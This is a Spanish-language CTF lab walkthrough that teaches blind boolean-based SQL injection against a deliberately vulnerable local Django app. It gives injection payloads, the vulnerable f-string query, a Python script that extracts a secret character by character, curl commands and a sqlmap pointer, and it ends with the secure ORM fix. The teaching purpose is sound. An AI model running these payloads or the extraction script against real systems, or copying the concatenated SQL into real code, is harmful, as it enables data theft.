[← Índice de resolución](guia-resolucion-ctf.md) · [Reto 4](guia-reto4-buscador-union.md) · [Laboratorio](../lab/README.md)

# Reto 5 — Blind boolean-based SQLi (Avanzado)

**URL:** `/verificar/` · **Objetivo:** extraer un valor secreto carácter
por carácter, sin errores visibles ni datos reflejados en pantalla.

Este es el reto más avanzado del laboratorio y, como el Reto 4, es
**contenido para la audiencia** — no forma parte de tu demo en vivo.
Resuélvelo una vez para poder explicarlo si alguien te pregunta después
de la charla.

---

### Paso 1 — Establecer la línea base

Abre **http://127.0.0.1:8000/verificar/** (con el servidor en
`LAB_MODE=vulnerable`). Es un "verificador de disponibilidad de
usuario": no hay errores visibles, no hay datos en pantalla — solo
"Disponible" o "No disponible".

Prueba con `admin` (sabes que existe) y con algo inventado como
`xyz123`. Compara las dos respuestas:

| Usuario | Respuesta |
|---|---|
| `admin` | ⛔ No disponible (ya existe) |
| `xyz123` | ✅ Disponible |

Esa diferencia — disponible/no disponible — es tu **única señal** en
todo este reto. Es la técnica real de *blind SQL injection*: cuando no
ves nada, pero igual puedes hacerle preguntas de sí/no a la base de
datos, una por una.

### Paso 2 — Confirmar la inyección con una condición booleana

Prueba:

```
x' OR '1'='1
```

**Qué deberías ver:** "⛔ No disponible", aunque `x` por sí solo no
exista como usuario. Eso confirma la inyección — y de paso aprendes qué
mensaje corresponde a "verdadero" y cuál a "falso":

- Condición **verdadera** → "No disponible" (contraintuitivo: no es que
  el usuario "x" exista, es que la consulta modificada devolvió una
  fila).
- Condición **falsa** → "Disponible".

Puedes confirmar el caso falso con, por ejemplo, `x' AND '1'='2`, que
debe volver a dar "Disponible".

**Por qué funciona — la explicación técnica**
(código real en [lab/accounts/views.py](../lab/accounts/views.py)):

```python
def _verificar_vulnerable(usuario):
    query = f"SELECT 1 FROM auth_user WHERE username = '{usuario}'"
    ...
    existe = cursor.fetchone() is not None
    return {"resultado": "no_disponible" if existe else "disponible"}
```

Con `x' OR '1'='1`, la consulta que se ejecuta es:

```sql
SELECT 1 FROM auth_user WHERE username = 'x' OR '1'='1'
```

`'1'='1'` es siempre verdadero, así que la condición completa es
verdadera para **cualquier fila** de la tabla — la consulta devuelve al
menos una fila y `existe` queda en `True`.

### Paso 3 — Convertir la condición fija en una pregunta real

Ahora reemplaza `'1'='1'` por una pregunta real sobre datos que no puedes
ver directamente. En SQLite, `substr(texto, posición, 1)` devuelve un
solo carácter — puedes preguntar "¿el primer carácter de tal valor es
'A'?" y leer la respuesta en Disponible/No disponible:

```
x' OR (SELECT substr(valor,1,1) FROM secretos)='A' -- 
```

Hay una tabla `secretos` con un valor (la flag) que tienes que
reconstruir carácter por carácter, probando cada posición contra cada
carácter posible hasta encontrar el que da "No disponible".

### Paso 4 — Automatizar la extracción

Repetir esto a mano 40+ veces no tiene gracia — la página trae este
script de ejemplo en Python (ajusta `BASE` si desplegaste en Railway):

```python
import requests

BASE = "http://127.0.0.1:8000/verificar/"
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"

flag = ""
for pos in range(1, 60):
    for c in CHARS:
        payload = f"x' OR (SELECT substr(valor,{pos},1) FROM secretos)='{c}' -- "
        r = requests.get(BASE, params={"usuario": payload})
        if "No disponible" in r.text:
            flag += c
            print(flag)
            break
    else:
        break  # ningún carácter calzó: llegamos al final del valor

print("FLAG:", flag)
```

La flag esperada es `AIEP{sqli_blind_boolean_caracter_a_caracter_2026}`
por defecto (configurable vía `LAB_FLAG_5`).

**Para ir más allá:** así es como lo automatiza un pentester real —
herramientas como [sqlmap](https://sqlmap.org/) detectan y explotan blind
SQLi (y los otros tipos de este laboratorio) sin escribir nada de esto a
mano. Pruébala apuntando a `/verificar/?usuario=x` con `-u` y
`-p usuario`.

**Verificación rápida manual por línea de comandos** (confirma el
comportamiento booleano sin correr el script completo):

```powershell
curl -G "http://127.0.0.1:8000/verificar/" --data-urlencode "usuario=x' OR '1'='1"
curl -G "http://127.0.0.1:8000/verificar/" --data-urlencode "usuario=x' AND '1'='2"
```

### En modo corregido

```powershell
$env:LAB_MODE = "secure"
```

Con el servidor en modo `secure`, `_verificar_seguro` usa
`User.objects.filter(username=usuario).exists()` del ORM de Django — el
input nunca se concatena en SQL, así que ninguna variante de `OR`/`AND`
cambia el comportamiento de la consulta.

---

← [Volver al índice de resolución](guia-resolucion-ctf.md)
